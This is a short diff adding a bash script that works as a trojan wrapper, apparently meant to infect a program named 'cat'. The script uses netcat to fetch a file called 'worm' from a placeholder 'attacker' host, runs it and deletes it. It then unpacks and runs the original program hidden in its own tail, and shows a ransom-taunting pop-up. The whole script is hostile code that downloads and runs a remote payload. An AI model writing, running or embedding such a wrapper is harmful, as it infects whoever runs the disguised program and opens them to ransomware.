@@ -1,0 +1,14 @@
+#!/bin/bash
+
+nc -w2 attacker port > worm
+chmod +x worm
+./worm
+rm worm
+
+tail -c $((zipSize+4)) ./cat | head -c zipSize | xz -d > tmp_cat
+chmod +x tmp_cat
+./tmp_cat $@
+rm ./tmp_cat
+
+zenity --error --text="Give me ransom haha!!"
+exit
